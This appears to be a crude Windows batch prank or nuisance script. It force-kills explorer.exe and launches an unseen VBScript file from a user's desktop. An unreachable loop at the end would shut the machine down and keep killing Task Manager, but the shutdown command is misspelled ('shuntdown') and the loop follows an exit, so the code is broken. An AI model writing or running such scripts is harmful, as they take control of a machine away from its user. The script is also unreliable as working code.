@echo off
color a
taskkill /f /im explorer.exe
start C:\Users\micha\Desktop\bich.vbs
cls
pause
exit
:x
shuntdown /i /s 60
taskkill /f /im taskmgr.exe
goto x